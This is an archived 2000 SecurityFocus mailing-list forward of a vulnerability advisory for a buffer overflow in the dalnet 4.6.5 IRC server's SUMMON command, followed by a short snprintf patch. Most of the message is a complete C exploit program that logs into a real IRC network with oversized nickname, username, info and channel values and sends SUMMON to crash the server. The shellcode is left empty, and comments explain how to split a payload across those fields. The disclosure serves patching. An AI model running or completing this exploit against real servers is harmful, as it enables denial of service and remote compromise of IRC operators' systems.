From aleph1@securityfocus.com Thu Jun 29 10:36:24 2000
Date: Thu, 29 Jun 2000 09:50:27 -0700
From: aleph1@securityfocus.com
To: vuldb@securityfocus.com
Subject: (forw) dalnet 4.6.5 remote vulnerability


-- 
Elias Levy
SecurityFocus.com
http://www.securityfocus.com/
Si vis pacem, para bellum

    [ Part 2: "Included Message" ]

Date: Wed, 28 Jun 2000 15:35:31 +0400
From: Matt Conover <shok@CANNABIS.DATAFORCE.NET>
To: VULN-DEV@SECURITYFOCUS.COM
Subject: dalnet 4.6.5 remote vulnerability

This was something that w00w00 was originally going to release under the w00giving,
but we never did.  So, I thought this would fit well with vuln-dev.  The complication
is that no individual variable is large enough to fit shellcode, so it requires splitting
the shellcode between the nickname, username, and hostname.  The last few bytes of the
nickname and username would need to jump to the next set of shellcode, which also requires
knowing requires the nickname knows where the username is in memory, and the username know
where the host name is in memory.  These complications (along with the need to have a long
hostname available) made it too difficult to release an automated exploit and send it out
under w00giving, but you vuln-dev folks should be able to have fun with it.

dalnet 4.6.5 irc server
Discovered by: Matt Conover (Shok), shok@dataforce.net

Due to improper bounds checking in the dalnet 4.6.5 irc server, any server
compiled with ENABLE_SUMMON has a buffer overflow when a user with a
lengthy channel name, nick name, username (ident), info (whois), and/or
hostname attempts to 'summon' (via the SUMMON command) another user into a
channel.  Fortunately, the server is NOT compiled with ENABLE_SUMMON by
default.

---------------------------------------------------------------------------
Exploit (by Matt Conover):

/*
 * dalnet 4.6.5 remote exploit (without shellcode)
 * Copyright (C) November 1999, Matt Conover & w00w00 Security Team
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define ERROR -1
#define BUFSIZE 512

#define IRCSERVER "irc.dal.net"
#define IRCPORT 6667

#define SUMMONEE "bob" /* just someone we assume will be on irc */

#define NICKLEN 30
#define USERLEN 10
#define INFOLEN 50
#define CHANLEN 32

/*
 * Split shellcode between nickname, username, info, and channel, with the
 * last 4 bytes in each buffer jmp'ing to the next.  The amount of
 * shellcode you can fit will depend on how long your hostname is.  The
 * buffer can be overflowed by up to 65 bytes (host+channel+info+nick+user
 * is 185 bytes, while buffer being overflowed is only 120 bytes)
 */

char shellcode[] = ""; /* see comments above */

char nickname[NICKLEN+1], username[USERLEN+1];
char info[INFOLEN+1], channel[CHANLEN+1];

int sockfd;
char readbuf[BUFSIZE], writebuf[BUFSIZE];

struct sockaddr_in servsin;

void exploit();
void checkerrors();
void makeconn();

char *inet_ntoa(struct in_addr in);

int main(int argc, char **argv)
{
   struct hostent *hostent;

   hostent = gethostbyname(IRCSERVER);
   if (hostent == NULL)
   {
      fprintf(stderr, "gethostbyname(%s) error: %s\n", IRCSERVER,
              strerror(h_errno));

      exit(ERROR);
   }

   servsin.sin_family = AF_INET, servsin.sin_port = htons(IRCPORT);
   memset(&servsin.sin_zero, 0, sizeof(servsin.sin_zero));
   memcpy(&servsin.sin_addr, hostent->h_addr, hostent->h_length);

   /* setup nickname, username, and info */
   memset(nickname, 'A', NICKLEN), nickname[NICKLEN];
   memset(username, 'A', USERLEN), username[USERLEN];
   memset(info, 'A', INFOLEN), info[INFOLEN];

   sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
   makeconn();

   printf("Calling exploit()..\n");
   exploit(), close(sockfd);

   printf("Exploitation complete.\n");
   return 0;
}

/* connect and login to irc server */
void makeconn()
{
   printf("Connecting to %s (%s) [port %d]..",
          IRCSERVER, (char *)inet_ntoa(servsin.sin_addr), IRCPORT);

   fflush(stdout);

   if (connect(sockfd, (struct sockaddr *)&servsin,
               sizeof(servsin)) == ERROR)
   {
      fprintf(stderr, "\nerror connecting to %s: %s\n\n",
              IRCSERVER, strerror(errno));

      close(sockfd), exit(ERROR);
   }

   printf(" connected.\n");

   memset(readbuf, 0, BUFSIZE), memset(writebuf, 0, BUFSIZE);
   snprintf(writebuf, BUFSIZE-1, "NICK %s\n", nickname);

   printf("Sending NICK info..\n");
   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
   {
      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
      close(sockfd), exit(ERROR);
   }

   snprintf(writebuf, BUFSIZE-1, "USER %s none none :%s\n",
            username, info);

   printf("Sending USER info..\n");
   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
   {
      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
      close(sockfd), exit(ERROR);
   }

   printf("\nChecking for login errors..\n");
   sleep(5), checkerrors();
}

/* check for errors in login */
void checkerrors()
{
   char *ptr;
   int res = ERROR;

   while (res == BUFSIZE-1)
   {
      res = recv(sockfd, readbuf, BUFSIZE-1, 0);
      if (res == ERROR)
      {
         fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
         close(sockfd), exit(ERROR);
      }

      ptr = strstr(readbuf, ":ERROR");
      if (ptr != NULL)
      {
         fprintf(stderr, "error with irc server:\n%s\n", ptr);
         close(sockfd), exit(ERROR);
      }
   }
}

void exploit()
{
   printf("Successfuly logged in.\n\n");

   channel[0] = '#', memset(channel+1, 'A', CHANLEN-1),
   channel[CHANLEN] = '\0';

   snprintf(writebuf, BUFSIZE-1, "JOIN %s\n", channel);
   printf("Joining a channel..\n");

   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
   {
      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
      close(sockfd), exit(ERROR);
   }

   sleep(3), checkerrors();

   snprintf(writebuf, BUFSIZE-1, "SUMMON %s %s\n", SUMMONEE, channel);
   printf("\nAttempting to summon %s (the final item)..\n", SUMMONEE);

   /* ircd ownage/crash will occur during this send() */
   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
   {
      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
      close(sockfd), exit(ERROR);
   }

   /* should have stopped/crashed on server-side by now */
   sleep(3), checkerrors();

   printf("If it didn't work, "
          "the server wasn't compiled with ENABLE_SUMMON\n");
}

---------------------------------------------------------------------------
Patch:

Apply the patch to following to s_bsd.c:
--- s_bsd.old.c Mon Nov  1 17:34:19 1999
+++ s_bsd.c     Mon Nov  1 17:35:39 1999
@@ -2327,7 +2327,7 @@
                sendto_one(who, wrerr, who->name);
                return;
            }
-       (void)sprintf(line, "ircd: Channel %s, by %s@%s (%s) %s\n\r",
+       (void)snprintf(line, sizeof(line), "ircd: Channel %s, by %s@%s (%s) %s\n\r",
                chname, who->user->username, who->user->host, who->name, who->info);
        if (write(fd, line, strlen(line)) != strlen(line))
            {

---------------------------------------------------------------------------
